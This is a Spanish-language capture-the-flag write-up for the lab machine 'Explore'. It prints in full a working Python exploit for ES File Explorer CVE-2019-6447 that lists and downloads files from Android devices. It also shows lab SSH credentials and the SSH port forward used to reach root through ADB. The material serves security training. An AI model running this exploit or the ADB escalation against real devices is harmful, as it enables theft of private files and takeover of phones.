# Explore

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.247
```

```bash
File: allPorts


# Nmap 7.91 scan initiated Thu Aug  5 18:35:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.247
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.247 ()	Status: Up
Host: 10.10.10.247 ()	Ports: 2222/open/tcp//EtherNetIP-1///, 42135/open/tcp/////, 44729/open/tcp/////, 59777/open/tcp/////
# Nmap done at Thu Aug  5 18:36:04 2021 -- 1 IP address (1 host up) scanned in 13.50 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p2222,42135,44729,59777 -oN targeted 10.10.10.247
```

```bash
File: targeted


# Nmap 7.91 scan initiated Thu Aug  5 18:36:38 2021 as: nmap -sC -sV -p2222,42135,44729,59777 -oN targeted 10.10.10.247
Nmap scan report for 10.10.10.247
Host is up (0.050s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
44729/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:49:58 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Thu, 05 Aug 2021 16:49:58 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Thu, 05 Aug 2021 16:50:03 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:03 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Thu, 05 Aug 2021 16:50:19 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/5%Time=610C139D%P=x86_64-pc-linux-gnu%r(NUL
SF:L,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44729-TCP:V=7.91%I=7%D=8/5%Time=610C139C%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x200
SF:5\x20Aug\x202021\x2016:49:58\x20GMT\r\nContent-Length:\x2022\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\x
SF:20Precondition\x20Failed\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2016:49
SF::58\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\.
SF:0\x20501\x20Not\x20Implemented\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2
SF:016:50:03\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/plai
SF:n;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x20
SF:supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Thu,\x2005\x20Aug\x202021\x2016:50:03\x20GMT\r\nConte
SF:nt-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\
SF:nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:\
SF:x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDat
SF:e:\x20Thu,\x2005\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\x
SF:2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:
SF:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq,
SF:DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2005\x20Aug\x2
SF:02021\x2016:50:19\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\x
SF:20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?\
SF:0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSer
SF:verCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Thu,\x2005
SF:\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\x2054\r\nContent-
SF:Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\
SF:nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20mstsh
SF:ash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Thu,\x2005\x20Aug\x202021\x2016:50:19\x20GMT\r\nContent-Length:\
SF:x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0e
SF:\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug  5 18:38:20 2021 -- 1 IP address (1 host up) scanned in 102.39 seconds
```

Como vemos, tendremos abiertos los puertos 2222 (SSH), 42135 (Es File Explorer HTTP), 44729 ([nmap](https://github.com/nmap/nmap) no logra identificarlo) y 59777 (HTTP).

Empezaremos enumerando los servidores web de los puertos 42135 y 59777.

<br>

### Servidor web en el puerto 42135
Si accedemos desde el navegador al servidor web del puerto 42135 veremos lo siguiente:

<img src="https://i.imgur.com/JGM9Oj3.png" width=150>

No nos aportará mucha información, pero sabremos que en ese puerto hay algún tipo de servidor HTTP.

<br>

### Servidor web en el puerto 59777
Trataremos de acceder desde el navegador al servidor HTTP del puerto 59777. Veremos lo siguiente:

<img src="https://i.imgur.com/oMlB0Yo.png" width=300>

Tampoco nos aportará mucha información, ya que no tendremos capacidad de directory listing.

<br>

### ES File Explorer
Recordando la fase de enumeración inicial con [nmap](https://github.com/nmap/nmap), sabremos que el servidor HTTP que corre en el puerto 42135 pertenece a la aplicación ES File Explorer. Trataremos de buscar algún exploit para esta aplicación. Con [SearchSploit](https://github.com/offensive-security/exploitdb):

<img src="https://i.imgur.com/aIIAd8r.png" width=700>

Encontraremos un exploit que nos permitirá listar y descargarnos archivos internos de la máquina víctima. Nos lo descargaremos y procederemos a inspeccionarlo:

```python
File: 50070.py


# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
# Date: 29/06/2021
# Exploit Author: Nehal Zaman
# Version: ES File Explorer v4.1.9.7.4
# Tested on: Android
# CVE : CVE-2019-6447

import requests
import json
import ast
import sys

if len(sys.argv) < 3:
    print(f"USAGE {sys.argv[0]} <command> <IP> [file to download]")
    sys.exit(1)

url = 'http://' + sys.argv[2] + ':59777'
cmd = sys.argv[1]
cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']
listCmds = cmds[:9]
if cmd not in cmds:
    print("[-] WRONG COMMAND!")
    print("Available commands : ")
    print("  listFiles         : List all Files.")
    print("  listPics          : List all Pictures.")
    print("  listVideos        : List all videos.")
    print("  listAudios        : List all audios.")
    print("  listApps          : List Applications installed.")
    print("  listAppsSystem    : List System apps.")
    print("  listAppsPhone     : List Communication related apps.")
    print("  listAppsSdcard    : List apps on the SDCard.")
    print("  listAppsAll       : List all Application.")
    print("  getFile           : Download a file.")
    print("  getDeviceInfo     : Get device info.")
    sys.exit(1)

print("\n==================================================================")
print("|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |")
print("|                Coded By : Nehal a.k.a PwnerSec                 |")
print("==================================================================\n")

header = {"Content-Type" : "application/json"}
proxy = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}

def httpPost(cmd):
    data = json.dumps({"command":cmd})
    response = requests.post(url, headers=header, data=data)
    return ast.literal_eval(response.text)

def parse(text, keys):
    for dic in text:
        for key in keys:
            print(f"{key} : {dic[key]}")
        print('')

def do_listing(cmd):
    response = httpPost(cmd)
    if len(response) == 0:
        keys = []
    else:
        keys = list(response[0].keys())
    parse(response, keys)

if cmd in listCmds:
    do_listing(cmd)

elif cmd == cmds[9]:
    if len(sys.argv) != 4:
        print("[+] Include file name to download.")
        sys.exit(1)
    elif sys.argv[3][0] != '/':
        print("[-] You need to provide full path of the file.")
        sys.exit(1)
    else:
        path = sys.argv[3]
        print("[+] Downloading file...")
        response = requests.get(url + path)
        with open('out.dat','wb') as wf:
            wf.write(response.content)
        print("[+] Done. Saved as `out.dat`.")

elif cmd == cmds[10]:
    response = httpPost(cmd)
    keys = list(response.keys())
    for key in keys:
        print(f"{key} : {response[key]}")
```

Veremos que la vulnerabilidad explota un servidor web en el puerto 59777 que ES File Explorer crea automaticamente al iniciarse . En el código veremos que están listados todos los comandos disponibles:

<img src="https://i.imgur.com/ClHrhO4.png" width=700>

Comezaremos a enumerar archivos potenciales que pueda contener la máquina víctima. Trataremos de listar las imágenes que se encuentran en la máquina víctima:

<img src="https://i.imgur.com/WDhdsno.png" width=700>

Veremos una imagen que nos llamará bastante la atención, **creds.jpg**. Trataremos de descargarla para poder visualizarla. Para ello el propio exploit nos proveerá del comando **getFile** que nos permitirá descargar archivos de la máquina víctima, para ello usaremos el comando **listPics**:

<img src="https://i.imgur.com/hUZ59Qq.png" width=700>

Como vemos el script nos descargará el archivo con el nombre **out.dat** por lo que procederemos a renombrarlo a **creds.jpg** y a visualizarlo:

<img src="https://i.imgur.com/aZS3EdG.jpg" width=300>

Nos encontraremos con las siguientes credenciales:

```plaintext
File: sshCreds


kristi:Kr1sT!5h@Rp3xPl0r3!
```

<br>

## Shell de usuario

### SSH
Recordando la fase de enumeración inicial, teníamos el puerto 2222 abierto, el cual correspondía a un servidor SSH, trataremos de conectarnos con las credenciales que acabamos de encontrar:

<img src="https://i.imgur.com/0Dwy7Ff.png" width=700>

Nos habremos conectado como el usuario **u0_a76** por lo que procederemos a visualizar la flag **user.txt** que se encontrará en el directorio **/sdcard**.

<br>

## Shell de root

### Enumeración
En este punto y con una shell como el usuario **u0_a76** trataremos de escalar privilegios para convertirnos en el usuario **root**. Comenzaremos listando las conexiones de red que se están llevando a cabo en el dispositivo, para ello:

```bash
netstat -a
```

<img src="https://i.imgur.com/VM1SMu9.png" width=700>

Como vemos, varios de los puertos que se listan corresponderán con puertos que hemos visto externamente en nuestro escaneo con [nmap](https://github.com/nmap/nmap). Habrá un puerto que nos llamará la atención, el puerto 5555, ya que este no lo hemos visto externamente. Investigaremos sobre el servicio que suele correr este puerto en dispositivos Android y veremos que se trata de un puerto que se puede habilitar para realizar operaciones con el programa **adb** sin tener que tener conectado el dispositivo por cable, esto es, vía WiFi.

Como no podemos ver este puerto abierto externamente y recordando que contábamos con credenciales validad para el servicio SSH, trataremos de hacer un port forwarding del puerto 5555 de la máquina víctima con el puerto 5555 de nuestra máquina. Para ello con el parámetro **-L**:

```bash
ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222
```

Si comprobamos si hay algún servicio corriendo en nuestra máquina en el puerto 5555:

<img src="https://i.imgur.com/URC9xMC.png" width=700>

Veremos que el puerto 5555 está ocupado por el servicio SSH, esto significará que el puerto 5555 de nuestra máquina corresponderá con el puerto 5555 de la máquina víctima.

<br>

### ADB
En este punto, trataremos de conectarnos mediante adb al dispositivo. Para ello nos conectaremos a nuestro puerto 5555 (recordemos que corresponde con el puerto 5555 de la máquina víctima), inicializaremos adb en modo root y listaremos los dispositivos conectados:

<img src="https://i.imgur.com/tgclqHv.png" width=700>

Como vemos, estaremos conectados al dispositivo víctima mediante **adb**. 

Para tener control sobre el dispositivo lanzaremos una shell interactiva, para ello:

<img src="https://i.imgur.com/x6q7exT.png" width=700>

Como vemos habremos accedido como el usuario **root** por lo que visualizaremos la flag **root.txt** en el directorio** /data**.